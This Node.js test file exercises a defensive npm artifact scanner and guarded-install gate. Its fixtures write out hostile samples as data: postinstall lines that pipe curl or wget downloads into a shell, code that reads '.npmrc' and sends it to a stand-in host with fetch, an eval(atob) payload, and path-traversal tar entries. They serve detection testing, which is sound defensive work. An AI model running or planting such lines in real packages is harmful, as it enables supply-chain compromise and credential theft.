const { test } = require('node:test');
const assert = require('node:assert/strict');
const { gzipSync } = require('node:zlib');
const { spawnSync } = require('node:child_process');
const { mkdtempSync, writeFileSync, rmSync } = require('node:fs');
const { join } = require('node:path');
const { tmpdir } = require('node:os');
const { createHash } = require('node:crypto');

function archive(entries) {
  const chunks = [];
  for (const entry of entries) {
    const body = Buffer.from(entry.body || '');
    const header = Buffer.alloc(512);
    header.write(entry.name, 0, 100, 'utf8');
    header.write('0000644\0', 100);
    header.write('0000000\0', 108);
    header.write('0000000\0', 116);
    header.write(body.length.toString(8).padStart(11, '0') + '\0', 124);
    header.write('00000000000\0', 136);
    header.fill(32, 148, 156);
    header.write(entry.type || '0', 156);
    header.write('ustar\0', 257);
    const checksum = header.reduce((sum, byte) => sum + byte, 0);
    header.write(checksum.toString(8).padStart(6, '0') + '\0 ', 148);
    chunks.push(header, body, Buffer.alloc((512 - body.length % 512) % 512));
  }
  chunks.push(Buffer.alloc(1024));
  return gzipSync(Buffer.concat(chunks));
}

const manifest = (scripts = {}) => ({ name: 'fixture', version: '1.0.0', scripts });
const packageEntry = scripts => ({ name: 'package/package.json', body: JSON.stringify(manifest(scripts)) });

test('bounded archive inspection reads source without extracting or executing it', async () => {
  const { inspectNpmArtifact } = await import('../src/npm-artifact-inspector.js');
  const bytes = archive([packageEntry({ install: 'node build.js' }), { name: 'package/index.js', body: 'export const value = 1;' }]);
  const report = inspectNpmArtifact(bytes);
  assert.equal(report.risk, 'none');
  assert.equal(report.coverage, 'bounded_source_scan');
  assert.equal(report.sourceFiles, 1);
  assert.ok(report.findings.some(item => item.rule.includes('lifecycle script is present')));
});

test('download-and-execute lifecycle scripts and same-file credential exfiltration are flagged', async () => {
  const { inspectNpmArtifact } = await import('../src/npm-artifact-inspector.js');
  const script = archive([packageEntry({ postinstall: 'curl https://example.test/install.sh | sh' })]);
  assert.equal(inspectNpmArtifact(script).risk, 'high');
  const source = archive([packageEntry(), { name: 'package/index.js', body: "const fs = require('fs'); fs.readFileSync('.npmrc'); fetch('https://example.test/upload');" }]);
  assert.equal(inspectNpmArtifact(source).risk, 'high');
  const separate = archive([packageEntry(), { name: 'package/a.js', body: "fs.readFileSync('.npmrc')" }, { name: 'package/b.js', body: "fetch('https://example.test')" }]);
  assert.equal(inspectNpmArtifact(separate).risk, 'none');
  const encoded = archive([packageEntry(), { name: 'package/index.js', body: "eval(atob('ZXZpbA=='))" }]);
  assert.equal(inspectNpmArtifact(encoded).risk, 'high');
  const examples = archive([packageEntry(), { name: 'package/index.js', body: "// fs.readFileSync('.npmrc'); fetch('https://example.test')\nconst example = \"eval(atob('ZXZpbA=='))\";" }]);
  assert.equal(inspectNpmArtifact(examples).risk, 'none');
});

test('unsupported links and bounded source limits prevent a clean claim', async () => {
  const { inspectNpmArtifact } = await import('../src/npm-artifact-inspector.js');
  const link = archive([packageEntry(), { name: 'package/linked.js', type: '2' }]);
  assert.equal(inspectNpmArtifact(link).risk, 'incomplete');
  const native = archive([packageEntry(), { name: 'package/native.node', body: 'not scanned' }]);
  assert.equal(inspectNpmArtifact(native).risk, 'incomplete');
  const bin = archive([{ name: 'package/package.json', body: JSON.stringify({ name: 'fixture', version: '1.0.0', bin: './bin/tool' }) }, { name: 'package/bin/tool', body: '#!/usr/bin/env node\nconsole.log(1)' }]);
  assert.equal(inspectNpmArtifact(bin).risk, 'none');
  assert.equal(inspectNpmArtifact(bin).sourceFiles, 1);
  const shell = archive([packageEntry(), { name: 'package/install.sh', body: 'echo fixture' }]);
  assert.equal(inspectNpmArtifact(shell).risk, 'incomplete');
  const wildcard = archive([{ name: 'package/package.json', body: JSON.stringify({ name: 'fixture', version: '1.0.0', exports: { './*': './lib/*' } }) }, { name: 'package/lib/one.js', body: 'export const one = 1;' }]);
  assert.equal(inspectNpmArtifact(wildcard).risk, 'none');
  const large = archive([packageEntry(), { name: 'package/index.js', body: 'x'.repeat(128) }]);
  assert.equal(inspectNpmArtifact(large, { textFile: 80 }).risk, 'incomplete');
  assert.throws(() => inspectNpmArtifact(large, { expanded: 1024 }), /safely expand/);
});

test('corrupt and outside-root tar entries fail closed', async () => {
  const { inspectNpmArtifact } = await import('../src/npm-artifact-inspector.js');
  assert.throws(() => inspectNpmArtifact(archive([{ name: '../escape', body: 'x' }, packageEntry()])), /outside package|Unsafe/);
  assert.throws(() => inspectNpmArtifact(archive([packageEntry(), { name: 'package/CON.js', body: 'x' }])), /platform-ambiguous/);
  assert.throws(() => inspectNpmArtifact(archive([packageEntry(), { name: 'package/PACKAGE.JSON', body: '{}' }])), /collide/);
  assert.throws(() => inspectNpmArtifact(archive([packageEntry(), { name: 'package/index.js', body: 'one' }, { name: 'package/INDEX.JS', body: 'two' }])), /collide/);
  assert.throws(() => inspectNpmArtifact(archive([{ name: 'package/index.js', body: 'x' }])), /no package/);
  assert.throws(() => inspectNpmArtifact(Buffer.from('not a gzip stream')), /safely expand/);
});

test('artifact command produces machine-readable findings and nonzero high-risk status', () => {
  const root = mkdtempSync(join(tmpdir(), 'guardog-artifact-cli-'));
  const file = join(root, 'fixture.tgz');
  writeFileSync(file, archive([packageEntry({ postinstall: 'wget https://example.test/run | bash' })]));
  try {
    const result = spawnSync(process.execPath, [join(__dirname, '..', 'src', 'index.js'), 'artifact', file, '--json'], { encoding: 'utf8' });
    assert.equal(result.status, 1);
    assert.equal(JSON.parse(result.stdout).risk, 'high');
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('guarded install rejects a flagged exact archive before network verdict or project mutation', async () => {
  const { runGuardedInstall } = await import('../src/guarded-install.js');
  const root = mkdtempSync(join(tmpdir(), 'guardog-artifact-gate-'));
  const original = JSON.stringify({ name: 'project', version: '1.0.0' });
  writeFileSync(join(root, 'package.json'), original);
  const bytes = archive([{ name: 'package/package.json', body: JSON.stringify({ name: 'child', version: '2.0.0', scripts: { postinstall: 'curl https://example.test/install | sh' } }) }]);
  const integrity = 'sha512-' + createHash('sha512').update(bytes).digest('base64');
  const tarball = 'https://registry.npmjs.org/child/-/child-2.0.0.tgz';
  let analyzed = false, commands = 0;
  const runner = (_command, args, options) => {
    commands++;
    if (args[0] !== 'install') throw new Error('npm ci must not run');
    writeFileSync(join(options.cwd, 'package-lock.json'), JSON.stringify({ lockfileVersion: 3, packages: {
      '': { name: 'project' }, 'node_modules/child': { version: '2.0.0', resolved: tarball, integrity }
    } }));
    return { status: 0 };
  };
  class Dog { async analyze() { analyzed = true; return { decision: { installAllowed: true } }; } }
  try {
    await assert.rejects(runGuardedInstall(['child'], Dog, { cwd: root, runner, platform: 'linux', fetchArtifact: async () => bytes,
      fetchMetadata: async () => ({ name: 'child', version: '2.0.0', dist: { tarball, integrity } }) }), /Install blocked by bounded artifact inspection/);
    assert.equal(analyzed, false);
    assert.equal(commands, 1);
    assert.equal(require('node:fs').readFileSync(join(root, 'package.json'), 'utf8'), original);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('student-facing exact npm scan verifies identity, host and digest', async () => {
  const { inspectExactNpmRelease, parseExactNpmSpec } = await import('../src/npm-artifact-fetch.js');
  assert.deepEqual(parseExactNpmSpec('npm:@scope/child@2.0.0'), { name: '@scope/child', version: '2.0.0' });
  assert.throws(() => parseExactNpmSpec('npm:child@latest'), /exact-version/);
  const bytes = archive([{ name: 'package/package.json', body: JSON.stringify({ name: 'child', version: '2.0.0' }) }]);
  const tarball = 'https://registry.npmjs.org/child/-/child-2.0.0.tgz';
  const integrity = 'sha512-' + createHash('sha512').update(bytes).digest('base64');
  const calls = [];
  const fetcher = async url => {
    calls.push(url);
    if (calls.length === 1) return { ok: true, json: async () => ({ name: 'child', version: '2.0.0', dist: { tarball, integrity } }) };
    return { ok: true, body: (async function* () { yield bytes; })() };
  };
  const result = await inspectExactNpmRelease('npm:child@2.0.0', fetcher);
  assert.equal(result.risk, 'none');
  assert.equal(result.source, 'verified_npm_registry');
  assert.equal(calls[1], tarball);
  await assert.rejects(inspectExactNpmRelease('npm:child@2.0.0', async () => ({ ok: true, json: async () => ({ name: 'child', version: '2.0.0', dist: { tarball: 'https://registry.npmjs.org.evil.test/file.tgz', integrity } }) })), /approved npm host/);
  await assert.rejects(inspectExactNpmRelease('npm:child@2.0.0', async url => url.includes('/-/')
    ? { ok: true, body: (async function* () { yield Buffer.from('wrong'); })() }
    : { ok: true, json: async () => ({ name: 'child', version: '2.0.0', dist: { tarball, integrity } }) }), /digest mismatch/);
});

test('ordinary zero-length package root directory entries are supported', async () => {
  const { inspectNpmArtifact } = await import('../src/npm-artifact-inspector.js');
  for (const name of ['package', 'package/']) {
    const report=inspectNpmArtifact(archive([{name,type:'5'},packageEntry(),{name:'package/index.js',body:'export const x=1;'}]));
    assert.equal(report.risk,'none');
    assert.equal(report.sourceFiles,1);
  }
});

test('root-directory compatibility never admits payloads, links or outside paths', async () => {
  const { inspectNpmArtifact } = await import('../src/npm-artifact-inspector.js');
  for (const entry of [{name:'package',type:'0',body:'x'},{name:'package',type:'2'},{name:'package',type:'5',body:'x'},{name:'package/',type:'5',body:'x'},{name:'package/',type:'0',body:'x'},{name:'package/',type:'2'},{name:'other',type:'5'},{name:'package/../',type:'5'}]) {
    assert.throws(()=>inspectNpmArtifact(archive([entry,packageEntry()])),/outside package|Unsafe/);
  }
});

test('large source inspection preserves malicious tail detection and separate manifest bounds', async () => {
  const { inspectNpmArtifact } = await import('../src/npm-artifact-inspector.js');
  const padding='/*'+ 'x'.repeat(2*1024*1024) +'😀*/\n';
  const bytes=archive([packageEntry(),{name:'package/large.js',body:padding+"fs.readFileSync('.npmrc'); fetch('https://example.test');"}]);
  const report=inspectNpmArtifact(bytes);
  assert.equal(report.risk,'high');assert.equal(report.sourceFiles,1);
  const largeManifest=archive([{name:'package/package.json',body:JSON.stringify({...manifest(),description:'x'.repeat(1024*1024)})}]);
  assert.throws(()=>inspectNpmArtifact(largeManifest),/oversized package manifest/);
});

test('source limits remain incomplete above eight MiB per file or twelve MiB aggregate',async()=>{
 const {inspectNpmArtifact}=await import('../src/npm-artifact-inspector.js');
 const single=archive([packageEntry(),{name:'package/large.js',body:' '.repeat(8*1024*1024+1)}]);
 assert.equal(inspectNpmArtifact(single).risk,'incomplete');
 const aggregate=archive([packageEntry(),...['one','two'].map(name=>({name:'package/'+name+'.js',body:' '.repeat(6*1024*1024+1)}))]);
 assert.equal(inspectNpmArtifact(aggregate).risk,'incomplete');
});

test('Unicode comments cannot hide executable code following the comment',async()=>{
 const {inspectNpmArtifact}=await import('../src/npm-artifact-inspector.js');
 const body='/*'+'😀'.repeat(5000)+'*/\n'+"fs.readFileSync('.npmrc'); fetch('https://example.test');";
 assert.equal(inspectNpmArtifact(archive([packageEntry(),{name:'package/x.js',body}])).risk,'high');
});

test('registry identity permits a consistent package basename root, never arbitrary or mixed roots',async()=>{
 const {inspectNpmArtifact}=await import('../src/npm-artifact-inspector.js');
 const entry={name:'node/package.json',body:JSON.stringify({name:'@types/node',version:'1.0.0'})};
 const limits={expectName:'@types/node',expectVersion:'1.0.0'};
 const entries=[{name:'node',type:'5'},entry,{name:'node/index.d.ts',body:'export declare const x: string;'}];
 assert.equal(inspectNpmArtifact(archive(entries),limits).risk,'none');
 for(const extra of [{name:'package/x.js',body:'x'},{name:'node/../../escape.js',body:'x'},{name:'other/x.js',body:'x'},{name:'node',type:'2'}])assert.throws(()=>inspectNpmArtifact(archive([...entries,extra]),limits),/root|outside|Unsafe/);
 assert.throws(()=>inspectNpmArtifact(archive(entries)),/root|outside/);
 assert.throws(()=>inspectNpmArtifact(archive(entries),{...limits,expectName:'other'}),/root|outside/);
});

test('legacy main resolves a JavaScript extension while exports and missing entries stay strict',async()=>{
 const {inspectNpmArtifact}=await import('../src/npm-artifact-inspector.js');
 const inspect=manifest=>inspectNpmArtifact(archive([{name:'package/package.json',body:JSON.stringify({name:'fixture',version:'1.0.0',...manifest})},{name:'package/dist/entry.js',body:'module.exports=1;'}]));
 assert.equal(inspect({main:'dist/entry'}).risk,'none');
 assert.equal(inspect({main:'dist/missing'}).risk,'incomplete');
 assert.equal(inspect({exports:'./dist/entry'}).risk,'incomplete');
 assert.equal(inspect({main:'dist/entry',exports:'./dist/entry'}).risk,'incomplete');
});

test('extensionless approved Node scripts receive full inspection with unchanged coverage limits',async()=>{
 const {inspectNpmArtifact}=await import('../src/npm-artifact-inspector.js');
 const scan=(body,limits={})=>inspectNpmArtifact(archive([{name:'package/package.json',body:JSON.stringify({...manifest(),bin:'bin/tool'})},{name:'package/bin/tool',body}]),limits);
 assert.equal(scan('#!/usr/bin/env node\nconsole.log(1);').risk,'none');
 assert.equal(scan("#!/usr/bin/env node\nfs.readFileSync('.npmrc'); fetch('https://example.test');").risk,'high');
 for(const header of ['#!/bin/sh','#!/usr/bin/env node --eval','#!/usr/bin/env python'])assert.equal(scan(header+'\nconsole.log(1)').risk,'incomplete');
 assert.equal(scan('#!/usr/bin/env node\n'+ 'x'.repeat(100),{textFile:80}).risk,'incomplete');
 assert.equal(scan('#!/usr/bin/env node\n\u0000').risk,'incomplete');
});

test('only missing types-only declaration exports are informational, including shared-path ordering',async()=>{
 const {inspectNpmArtifact}=await import('../src/npm-artifact-inspector.js');
 const scan=exports=>inspectNpmArtifact(archive([{name:'package/package.json',body:JSON.stringify({...manifest(),exports})}]));
 const metadata=scan({types:'./missing.d.ts'});assert.equal(metadata.risk,'none');assert.equal(metadata.findings[0].severity,'info');
 assert.equal(scan({types:'./missing.js'}).risk,'incomplete');
 for(const exports of [{types:'./missing.d.ts',import:'./missing.d.ts'},{import:'./missing.d.ts',types:'./missing.d.ts'}])assert.equal(scan(exports).risk,'incomplete');
});
